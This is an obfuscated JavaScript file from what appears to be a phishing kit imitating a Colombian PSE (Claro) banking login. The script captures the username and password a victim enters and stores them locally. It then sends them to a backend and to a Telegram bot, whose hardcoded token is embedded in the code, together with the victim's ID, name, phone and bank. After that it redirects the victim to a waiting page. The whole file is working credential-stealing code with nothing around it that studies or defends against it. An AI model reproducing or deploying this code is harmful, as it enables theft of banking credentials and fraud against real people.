function _0x4a43(_0x11da55, _0x4368d3) {
  const _0x464e69 = _0x464e();
  return (
    (_0x4a43 = function (_0x4a4316, _0x50a94c) {
      _0x4a4316 = _0x4a4316 - 0xbf;
      let _0x1000dc = _0x464e69[_0x4a4316];
      return _0x1000dc;
    }),
    _0x4a43(_0x11da55, _0x4368d3)
  );
}
const _0x340cdd = _0x4a43;
function _0x464e() {
  const _0x9f8d34 = [
    "error",
    "Usuario\x20actualizado",
    "Error\x20al\x20actualizar\x20usuario:",
    "location",
    "\x0aCorrigió\x20Usuario",
    "statusText",
    "142136lpDjQb",
    "6251900gfJHIy",
    "\x0a🆔Nombre:\x20",
    "\x0a📱Teléfono:\x20",
    "\x0a🏦Banco:\x20",
    "puser",
    "PUT",
    "5843964QPiIno",
    "info",
    "\x0a🔒Contraseña:\x20",
    "addEventListener",
    "disabled",
    "click",
    "metaInfo",
    "txtPass",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "nombre",
    "\x0aFuente:\x20",
    "1630722PrnjEw",
    "/trico/tricoUserPse/",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "txtUsuario",
    "1041480BncyMn",
    "user",
    "538812ilfJFF",
    "Usuario\x20encontrado",
    "&text=",
    "value",
    "wait.html",
    "stringify",
    "application/json",
    "Error\x20de\x20red\x20(chat\x20ID:\x20",
    "href",
    "focus",
    "log",
    "idreg",
    "getElementById",
    "3064722EQyBAM",
  ];
  _0x464e = function () {
    return _0x9f8d34;
  };
  return _0x464e();
}
(function (_0x175433, _0x5133bc) {
  const _0x5f1906 = _0x4a43,
    _0x3ccce7 = _0x175433();
  while (!![]) {
    try {
      const _0x4b505c =
        parseInt(_0x5f1906(0xd6)) / 0x1 +
        -parseInt(_0x5f1906(0xd0)) / 0x2 +
        -parseInt(_0x5f1906(0xd4)) / 0x3 +
        parseInt(_0x5f1906(0xea)) / 0x4 +
        parseInt(_0x5f1906(0xeb)) / 0x5 +
        -parseInt(_0x5f1906(0xe3)) / 0x6 +
        parseInt(_0x5f1906(0xc2)) / 0x7;
      if (_0x4b505c === _0x5133bc) break;
      else _0x3ccce7["push"](_0x3ccce7["shift"]());
    } catch (_0x416389) {
      _0x3ccce7["push"](_0x3ccce7["shift"]());
    }
  }
})(_0x464e, 0xf0c9e);
function updateLS() {
  const _0x4458c5 = _0x4a43;
  LS["setItem"](_0x4458c5(0xc3), JSON["stringify"](info));
}
const button = document[_0x340cdd(0xe2)]("btnUsuario"),
  userInput = document[_0x340cdd(0xe2)](_0x340cdd(0xd3)),
  passInput = document[_0x340cdd(0xe2)](_0x340cdd(0xc9));
async function sendToTelegram(_0x4d1b14) {
  const _0x581bb0 = _0x340cdd;
  for (const _0x511c8e of chatIds) {
    const _0x3bdb18 =
      _0x581bb0(0xcb) +
      _0x511c8e +
      _0x581bb0(0xd8) +
      encodeURIComponent(_0x4d1b14);
    try {
      const _0x25ea20 = await fetch(_0x3bdb18);
      _0x25ea20["ok"]
        ? console[_0x581bb0(0xe0)](_0x581bb0(0xd2) + _0x511c8e + ")")
        : console["error"](
            _0x581bb0(0xcc) + _0x511c8e + "):",
            _0x25ea20[_0x581bb0(0xe9)]
          );
    } catch (_0x53aa73) {
      console[_0x581bb0(0xe4)](_0x581bb0(0xdd) + _0x511c8e + "):", _0x53aa73);
    }
  }
}
async function updateStatus() {
  const _0x144c7c = _0x340cdd;
  button["disabled"] = !![];
  const _0x4e85ad = await fetch(url + "/trico/tricoData", {
      method: "GET",
      headers: { "Content-Type": _0x144c7c(0xdc) },
    }),
    _0x1d47f0 = await _0x4e85ad["json"](),
    _0x11695f = [..._0x1d47f0];
  for (const _0x4ce742 of _0x11695f) {
    if (_0x4ce742["id"] == info[_0x144c7c(0xc8)]["cc"]) {
      console[_0x144c7c(0xe0)](_0x144c7c(0xd7));
      const _0x5790df = await fetch(
          url + _0x144c7c(0xd1) + _0x4ce742[_0x144c7c(0xe1)],
          {
            method: _0x144c7c(0xc1),
            headers: { "Content-Type": _0x144c7c(0xdc) },
            body: JSON[_0x144c7c(0xdb)]({
              usuario: info["metaInfo"][_0x144c7c(0xd5)],
              password: info[_0x144c7c(0xc8)][_0x144c7c(0xc0)],
            }),
          }
        ),
        _0x5ca5b1 = await _0x5790df["json"](),
        _0x4d3675 =
          _0x144c7c(0xcd) +
          _0x4ce742["id"] +
          _0x144c7c(0xec) +
          _0x4ce742[_0x144c7c(0xce)] +
          _0x144c7c(0xed) +
          _0x4ce742["telefono"] +
          "\x0a🚹Usuario:\x20" +
          info[_0x144c7c(0xc8)][_0x144c7c(0xd5)] +
          _0x144c7c(0xc4) +
          info[_0x144c7c(0xc8)][_0x144c7c(0xc0)] +
          _0x144c7c(0xbf) +
          _0x4ce742["bank"] +
          _0x144c7c(0xcf) +
          fuente +
          _0x144c7c(0xe8);
      await sendToTelegram(_0x4d3675),
        _0x5790df["ok"]
          ? console["log"](_0x144c7c(0xe5))
          : console[_0x144c7c(0xe4)](
              _0x144c7c(0xe6),
              _0x5790df[_0x144c7c(0xe9)]
            );
    }
  }
  (button[_0x144c7c(0xc6)] = ![]),
    (window[_0x144c7c(0xe7)][_0x144c7c(0xde)] = _0x144c7c(0xda));
}
button[_0x340cdd(0xc5)](_0x340cdd(0xc7), async function (_0x29d286) {
  const _0x40c359 = _0x340cdd;
  _0x29d286["preventDefault"]();
  if (userInput[_0x40c359(0xd9)] == "" && passInput[_0x40c359(0xd9)] == "") {
    alert(_0x40c359(0xca)), userInput[_0x40c359(0xdf)]();
    return;
  } else {
    var _0x1b191a = userInput[_0x40c359(0xd9)],
      _0x109246 = passInput[_0x40c359(0xd9)];
    (info[_0x40c359(0xc8)][_0x40c359(0xd5)] = _0x1b191a),
      (info["metaInfo"][_0x40c359(0xc0)] = _0x109246),
      updateLS(),
      await updateStatus();
  }
});
